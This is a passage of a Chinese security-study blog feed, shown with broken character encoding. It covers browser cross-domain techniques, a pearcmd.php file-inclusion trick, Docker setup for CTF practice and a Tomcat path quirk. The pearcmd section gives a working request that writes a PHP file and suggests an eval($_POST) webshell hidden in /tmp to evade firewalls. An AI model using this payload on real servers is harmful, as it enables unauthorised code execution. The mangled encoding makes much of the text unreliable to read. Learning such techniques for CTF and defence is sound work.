å±æ€§ï¼Œè¯¥å±æ€§æœ‰ä¸ªç‰¹å¾ï¼šå³åœ¨ä¸€ä¸ªçª—å£ï¼ˆwindowï¼‰çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçª—å£è½½å…¥çš„æ‰€æœ‰çš„é¡µé¢ï¼ˆä¸ç®¡æ˜¯ç›¸åŒåŸŸçš„é¡µé¢è¿˜æ˜¯ä¸åŒåŸŸçš„é¡µé¢ï¼‰éƒ½æ˜¯å…±äº«ä¸€ä¸ª <code>window.name</code> çš„ï¼Œæ¯ä¸ªé¡µé¢å¯¹ <code>window.name</code> éƒ½æœ‰è¯»å†™çš„æƒé™ï¼Œ<code>window.name</code> æ˜¯æŒä¹…å­˜åœ¨ä¸€ä¸ªçª—å£è½½å…¥è¿‡çš„æ‰€æœ‰é¡µé¢ä¸­çš„ï¼Œå¹¶ä¸ä¼šå› æ–°é¡µé¢çš„è½½å…¥è€Œè¿›è¡Œé‡ç½®ã€‚</p></blockquote><p>é€šè¿‡ä¸‹é¢çš„ä¾‹å­ä»‹ç»å¦‚ä½•é€šè¿‡ <a href="https://link.juejin.cn/?target=http://window.name">window.name</a> æ¥è·¨åŸŸè·å–æ•°æ®çš„ã€‚</p><p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// é‡ç½® iframe çš„ onload äº‹ä»¶ç¨‹åºï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// æ­¤æ—¶ç»è¿‡åé¢ä»£ç é‡ç½® src ä¹‹åï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// http://www.laixiangran.cn/a.html é¡µé¢ä¸è¯¥ iframe åœ¨åŒä¸€ä¸ªæºäº†ï¼Œå¯ä»¥ç›¸äº’è®¿é—®äº†</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> data = iframe.<span class="property">contentWindow</span>.<span class="property">name</span>; <span class="comment">// 4. è·å– iframe é‡Œçš„ window.name</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// hello world!</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. é‡ç½®ä¸€ä¸ªä¸ http://www.laixiangran.cn/a.html é¡µé¢åŒæºçš„é¡µé¢</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">src</span> = <span class="string">&#x27;http://www.laixiangran.cn/c.html&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. ç»™å½“å‰çš„ window.name è®¾ç½®ä¸€ä¸ª http://www.laixiangran.cn/a.html é¡µé¢æƒ³è¦å¾—åˆ°çš„æ•°æ®å€¼ </span><br><span class="line">    <span class="attr">window.name</span> = <span class="string">&quot;hello world!&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="location-hash-è·¨åŸŸ"><a href="#location-hash-è·¨åŸŸ" class="headerlink" title="location.hash è·¨åŸŸ"></a>location.hash è·¨åŸŸ</h2><blockquote><p>location.hash æ–¹å¼è·¨åŸŸï¼Œæ˜¯å­æ¡†æ¶ä¿®æ”¹çˆ¶æ¡†æ¶ src çš„ hash å€¼ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§è¿›è¡Œä¼ é€’æ•°æ®ï¼Œä¸”æ›´æ”¹ hash å€¼ï¼Œé¡µé¢ä¸ä¼šåˆ·æ–°ã€‚ä½†æ˜¯ä¼ é€’çš„æ•°æ®çš„å­—èŠ‚æ•°æ˜¯æœ‰é™çš„ã€‚</p></blockquote><p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. è·å–é€šè¿‡ http://laixiangran.cn/b.html é¡µé¢è®¾ç½® hash å€¼</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. è®¾ç½®çˆ¶é¡µé¢çš„ hash å€¼</span><br><span class="line">    <span class="attr">parent.location.hash</span> = <span class="string">&quot;world&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="postMessage-è·¨åŸŸ"><a href="#postMessage-è·¨åŸŸ" class="headerlink" title="postMessage è·¨åŸŸ"></a>postMessage è·¨åŸŸ</h2><blockquote><p>window.postMessage(messageï¼ŒtargetOrigin) æ–¹æ³•æ˜¯ HTML5 æ–°å¼•è¿›çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥å‘å…¶å®ƒçš„ window å¯¹è±¡å‘é€æ¶ˆæ¯ï¼Œæ— è®ºè¿™ä¸ª window å¯¹è±¡æ˜¯å±äºåŒæºæˆ–ä¸åŒæºã€‚è¿™ä¸ªåº”è¯¥å°±æ˜¯ä»¥åè§£å†³ dom è·¨åŸŸé€šç”¨æ–¹æ³•äº†ã€‚</p><p>è°ƒç”¨ postMessage æ–¹æ³•çš„ window å¯¹è±¡æ˜¯æŒ‡è¦æ¥æ”¶æ¶ˆæ¯çš„é‚£ä¸€ä¸ª window å¯¹è±¡ï¼Œè¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•° message ä¸ºè¦å‘é€çš„æ¶ˆæ¯ï¼Œç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼›ç¬¬äºŒä¸ªå‚æ•° targetOrigin ç”¨æ¥é™å®šæ¥æ”¶æ¶ˆæ¯çš„é‚£ä¸ª window å¯¹è±¡æ‰€åœ¨çš„åŸŸï¼Œå¦‚æœä¸æƒ³é™å®šåŸŸï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *ã€‚</p><p>éœ€è¦æ¥æ”¶æ¶ˆæ¯çš„ window å¯¹è±¡ï¼Œå¯æ˜¯é€šè¿‡ç›‘å¬è‡ªèº«çš„ message äº‹ä»¶æ¥è·å–ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼Œæ¶ˆæ¯å†…å®¹å‚¨å­˜åœ¨è¯¥äº‹ä»¶å¯¹è±¡çš„ data å±æ€§ä¸­ã€‚</p></blockquote><p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. è·å– http://laixiangran.cn/b.html é¡µé¢çš„ window å¯¹è±¡ï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ç„¶åé€šè¿‡ postMessage å‘ http://laixiangran.cn/b.html é¡µé¢å‘é€æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">        win.<span class="title function_">postMessage</span>(<span class="string">&#x27;æˆ‘æ˜¯æ¥è‡ª http://www.laixiangran.cn/a.html é¡µé¢çš„æ¶ˆæ¯&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure><p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// æ³¨å†Œ message äº‹ä»¶ç”¨æ¥æ¥æ”¶æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e = e || event; <span class="comment">// è·å–äº‹ä»¶å¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// é€šè¿‡ data å±æ€§å¾—åˆ°å‘é€æ¥çš„æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><blockquote><ul><li><a href="https://link.juejin.cn/?target=https://www.cnblogs.com/2050/p/3191744.html">jsä¸­å‡ ç§å®ç”¨çš„è·¨åŸŸæ–¹æ³•åŸç†è¯¦è§£</a></li><li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/28562290">è·¨åŸŸçš„é‚£äº›äº‹å„¿</a></li><li><a href="https://link.juejin.cn/?target=http://www.ruanyifeng.com/blog/2016/04/cors.html">è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</a></li></ul></blockquote><h1 id="9-pearcmd-phpçš„å·§å¦™åˆ©ç”¨"><a href="#9-pearcmd-phpçš„å·§å¦™åˆ©ç”¨" class="headerlink" title="9.pearcmd.phpçš„å·§å¦™åˆ©ç”¨"></a>9.<code>pearcmd.php</code>çš„å·§å¦™åˆ©ç”¨</h1><blockquote><p>æ¥è‡ªPç¥åšå®¢</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p></blockquote><p>å°±æ˜¯åˆ©ç”¨<code>pearcmd.php</code>è¿™ä¸ª<code>pecl/pear</code>ä¸­çš„æ–‡ä»¶ã€‚</p><p><code>pecl</code>æ˜¯<code>PHP</code>ä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œ<code>pear</code>æ˜¯<code>pecl</code>ä¾èµ–çš„ç±»åº“ã€‚åœ¨<code>7.3</code>åŠä»¥å‰ï¼Œ<code>pecl/pear</code>æ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨<code>7.4</code>åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘<code>PHP</code>çš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨<code>Docker</code>ä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œ<code>pcel/pear</code>éƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p><blockquote><p>åŸæœ¬pear&#x2F;pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php</span><br></pre></td></tr></table></figure><blockquote><p>#config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­</p></blockquote><p>å‘é€æ•°æ®åŒ…ï¼Œç›®æ ‡å°†ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶<code>/tmp/hello.php</code>ï¼Œå…¶å†…å®¹åŒ…å«<code>&lt;?=phpinfo()?&gt;</code></p><blockquote><p><code>/tmp/hello.php</code><br>å½“ç„¶ä¹Ÿå¯ä»¥æ”¹æˆ<code>/var/html/www</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è¯»å–ï¼Œä¸ç”¨åˆ©ç”¨æ–‡ä»¶åŒ…å«å‚æ•°è¿›è¡Œå¯¹<code>/tmp/hello.php</code>è¯»å–</p><p>åªæ˜¯æ”¾åœ¨<code>/tmp</code>ä¸‹ä¸å®¹æ˜“è§¦å‘é˜²ç«å¢™è¢«åˆ é™¤</p></blockquote><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«å­˜åœ¨ï¼Œå†åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„ä¿¡æ¯</p><blockquote><p><code>&lt;?=phpinfo()?&gt;</code><br>ä¹Ÿå¯ä»¥æ”¹å†™æˆ<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œæ›´å¤šçš„å‘½ä»¤äº†</p></blockquote><h1 id="10-è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ"><a href="#10-è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ" class="headerlink" title="10.è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ"></a>10.è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ</h1><h2 id="1-æ„é€ é•œåƒ"><a href="#1-æ„é€ é•œåƒ" class="headerlink" title="1.æ„é€ é•œåƒ"></a>1.æ„é€ é•œåƒ</h2><p><img src="/2022/05/31/daily/image-20230122143200058.png" alt="image-20230122143200058"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ª<code>Dockerfile</code>æ–‡ä»¶</p><blockquote><p><code>docker build -t image_name .</code><br>&#x2F;&#x2F;è¿™é‡Œæ˜¯åˆ©ç”¨<code>dockerfile</code>åˆ›å»ºä¸€ä¸ªå‘½åä¸º<code>image_name</code>çš„é•œåƒã€åé¢çš„ç‚¹ä¸èƒ½å°‘ã€‘</p></blockquote><p><img src="/2022/05/31/daily/image-20230122143320959.png" alt="image-20230122143320959"></p><h2 id="2-æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ"><a href="#2-æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ" class="headerlink" title="2.æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ"></a>2.æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ</h2><blockquote><p><code>docker images</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122144225392.png" alt="image-20230122144225392"></p><h2 id="3-è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ"><a href="#3-è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ" class="headerlink" title="3.è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ"></a>3.è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ</h2><blockquote><p><code>docker run -i -d -P image_name</code> </p></blockquote><p><img src="/2022/05/31/daily/image-20230122144315740.png" alt="image-20230122144315740"></p><h2 id="4-æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£"><a href="#4-æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£" class="headerlink" title="4.æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£"></a>4.æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£</h2><blockquote><p><code>docker ps -a</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122144348333.png" alt="image-20230122144348333"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å†32768ç«¯å£è¿è¡Œ</p><blockquote><p>è®¿é—®<code>127.0.0.1:32768</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122144453902.png" alt="image-20230122144453902"></p><p>æ­å»ºæˆåŠŸ</p><h2 id="5-å…³é—­å®¹å™¨"><a href="#5-å…³é—­å®¹å™¨" class="headerlink" title="5.å…³é—­å®¹å™¨"></a>5.å…³é—­å®¹å™¨</h2><blockquote><p><code>docker ps -a</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122150253748.png" alt="image-20230122150253748"></p><blockquote><p><code>docker stop CONTAINER ID </code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122214402594.png" alt="image-20230122214402594"></p><h2 id="6-åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘"><a href="#6-åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘" class="headerlink" title="6.åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘"></a>6.åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘</h2><blockquote><p><code>docker images</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122150428681.png" alt="image-20230122150428681"></p><blockquote><p><code>docker rmi IMAGE ID</code></p><p>&#x2F;&#x2F;æ³¨ï¼šæœ‰çš„éœ€è¦å¼ºåˆ¶ï¼Œæ‰€ä»¥éœ€è¦åœ¨åé¢åŠ ä¸Šå‚æ•°<code>-f</code></p></blockquote><p><img src="/2022/05/31/daily/image-20230122214537155.png" alt="image-20230122214537155"></p><h1 id="11-libmbflæ‰“åˆ†"><a href="#11-libmbflæ‰“åˆ†" class="headerlink" title="11.libmbflæ‰“åˆ†"></a>11.libmbflæ‰“åˆ†</h1><blockquote><p>æ‰€ä»¥å®ç°<code>$charset == BASE64</code>ï¼Œåªè¦æ–‡ä»¶å†…å®¹å‰é¢æ•°æ®è®©å®ƒè¯†åˆ«ä¸ºbase64å³å¯</p><p>é‚£ä¹ˆå¦‚ä½•è®©å…¶è®¤ä¸ºæ˜¯base64å‘¢ï¼Ÿ</p><p>è¿™å°±æ¶‰åŠåˆ°<code>libmbfl</code>çš„æ‰“åˆ†ï¼Œ<code>libmbfl</code>æ˜¯<code>mb</code>æ‰©å±•</p><p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p><p>æˆ‘çš„ç†è§£å°±æ˜¯ç±»ä¼¼åƒ<code>checkengine</code>ï¼Œæ¯”å¦‚<code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p></blockquote><p>è¿™æ˜¯æ‰“åˆ†åˆ¤æ–­</p><blockquote><p>0xFFFFæ˜¯-1ï¼Œ&gt;&#x3D;0 </p><blockquote><p>0x21æ˜¯33 33å¯¹åº”!</p><p>0x2Fæ˜¯47 47å¯¹åº”&#x2F;</p><p><code>47&gt;=c&gt;=33</code></p></blockquote><p><code>/</code>æ‰“åˆ†æ‰“çš„å¤š</p></blockquote><h1 id="12-Tomcatä»¥-ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–"><a href="#12-Tomcatä»¥-ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–" class="headerlink" title="12.Tomcatä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–"></a>12.Tomcatä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–</h1><blockquote><p><code>;</code>åçš„æ•°æ®ä¸è§£æ</p><p>å³å¯<code>http://127.0.0.1/index;123.ico</code>ï¼Œè¯»å–æ—¶åªè§†ä¸º<code>http://127.0.0.1/index</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBå­¦ä¹ </title>
      <link href="/2022/05/28/Web-study/"/>
      <url>/2022/05/28/Web-study/</url>
      
        <content type="html"><![CDATA[<p><code>å­¦ä¼šä¸€æ ·ä¸œè¥¿ï¼Œæœ€é‡è¦ç‰¹å¾å°±æ˜¯å¯ä»¥æŠŠä¸€ä¸ªçŸ¥è¯†ç‚¹çš„åŸç†å¼„æ‡‚ï¼Œé€ æˆä¸€æ¬¡æˆåŠŸæ³¨å…¥ï¼Œè¦æ³¨æ„åˆ†ææºç å½“ä¸­å¯¼è‡´è¿™ä¸ªæ¼æ´çš„é—®é¢˜ç‚¹ï¼Œåˆåº”è¯¥å¦‚ä½•æ”¹è¿›ä¸é˜²å¾¡ï¼Œ</code></p><p><code>ä¸è¦æ€¥äºæ±‚æˆï¼Œæ…¢å³æ˜¯å¿«ï¼Œå°‘å³æ˜¯å¤š</code></p><p><code>å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œä¸€äº›çŸ¥è¯†ç‚¹è¿˜æ˜¯è¦å¤šå†™å‡ éæ¥è®°ä½ï¼Œä¸æ˜¯ç®€å•ctrl+c/+vå°±å­¦åˆ°äº†ï¼Œä¸Šæœºè‡ªå·±ç»ƒä¹ ï¼Œæ‰“é¶åœºï¼Œæ°¸è¿œæ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ï¼Œä¸€å®šå­¦ä¼šæ–‡ç« å’Œå®é™…æ“ä½œå¯†åˆ‡ç»“åˆï¼ŒåšæŒåšç¬”è®°</code></p><p><code>å­¦ä¸œè¥¿å°±åªå½“å­¦ä¸€æ¬¡ï¼Œä¸€æ¬¡å­¦åˆ°æœ€å¥½ï¼Œä¸è¦å›«å›µåæ£</code></p><span id="more"></span><hr><h1 id="åŸºç¡€æ¼æ´çŸ¥è¯†"><a href="#åŸºç¡€æ¼æ´çŸ¥è¯†" class="headerlink" title="åŸºç¡€æ¼æ´çŸ¥è¯†"></a>åŸºç¡€æ¼æ´çŸ¥è¯†</h1><blockquote><p>â€“è½¬è½½åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p></blockquote><h2 id="ä¸€ã€sqlæ¼æ´ç¯‡"><a 